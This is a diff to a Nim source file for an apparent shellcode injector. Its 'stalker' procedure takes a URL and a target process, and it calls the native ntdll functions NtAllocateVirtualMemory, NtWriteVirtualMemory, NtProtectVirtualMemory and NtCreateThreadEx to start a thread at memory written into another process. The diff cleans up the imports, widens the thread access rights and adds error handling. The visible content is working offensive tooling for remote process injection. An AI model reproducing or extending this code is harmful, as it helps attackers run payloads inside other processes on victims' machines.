@@ -99,19 +99,19 @@ type
     PUSER_THREAD_START_ROUTINE = ptr USER_THREAD_START_ROUTINE
 
 proc NtAllocateVirtualMemory(ProcessHandle: HANDLE, BaseAddress: LPVOID, ZeroBits: ULONG_PTR, RegionSize: PSIZE_T, AllocationType: ULONG, Protect: ULONG): NTSTATUS 
-  {.discardable, stdcall, dynlib: "ntdll", importc: "NtAllocateVirtualMemory".}
+  {.discardable, stdcall, dynlib: "ntdll", importc.}
 
 proc NtWriteVirtualMemory(ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, NumberOfBytesToWrite: ULONG, NumberOfBytesWritten: PULONG): NTSTATUS
-  {.discardable, stdcall, dynlib: "ntdll", importc: "NtWriteVirtualMemory".}
+  {.discardable, stdcall, dynlib: "ntdll", importc.}
 
 proc NtProtectVirtualMemory(ProcessHandle: HANDLE, BaseAddress: LPVOID, NumberOfBytesToProtect: PULONG, NewAccessProtection: ULONG, OldAccessProtection: PULONG): NTSTATUS
-  {.discardable, stdcall, dynlib: "ntdll", importc: "NtProtectVirtualMemory".}
+  {.discardable, stdcall, dynlib: "ntdll", importc.}
 
 proc NtCreateThreadEx(ThreadHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, ProcessHandle: HANDLE, StartRoutine: PUSER_THREAD_START_ROUTINE, Argument: PVOID, CreateFlags: ULONG, ZeroBits: SIZE_T, StackSize: SIZE_T, MaximumStackSize: SIZE_T, AttributeList: PVOID): NTSTATUS
-  {.discardable, stdcall, dynlib: "ntdll", importc: "NtCreateThreadEx".}
+  {.discardable, stdcall, dynlib: "ntdll", importc.}
 
 proc NtWaitForSingleObject(Handle: HANDLE, Alertable: BOOLEAN, Timeout: PLARGE_INTEGER): NTSTATUS
-  {.discardable, stdcall, dynlib: "ntdll", importc: "NtWaitForSingleObject".}
+  {.discardable, stdcall, dynlib: "ntdll", importc.}
 
 
 proc stalker(url: string, target = "", parent = 0, kill = false) =
@@ -197,7 +197,7 @@ proc stalker(url: string, target = "", parent = 0, kill = false) =
     echo("[+] NtCreateThreadEx")
     var hThread: HANDLE
     ret = NtCreateThreadEx(addr hThread,
-                           STANDARD_RIGHTS_ALL or SPECIFIC_RIGHTS_ALL,
+                           THREAD_ALL_ACCESS,
                            NULL,
                            hTarget,
                            cast[PUSER_THREAD_START_ROUTINE](baseAddress),
@@ -207,6 +207,9 @@ proc stalker(url: string, target = "", parent = 0, kill = false) =
                            0,
                            0,
                            NULL)
+    if ret != STATUS_SUCCESS:
+        panic("NtCreateThreadEx", ret)
+
     defer:
         echo("[+] Closing thread handle")
         CloseHandle(hThread)
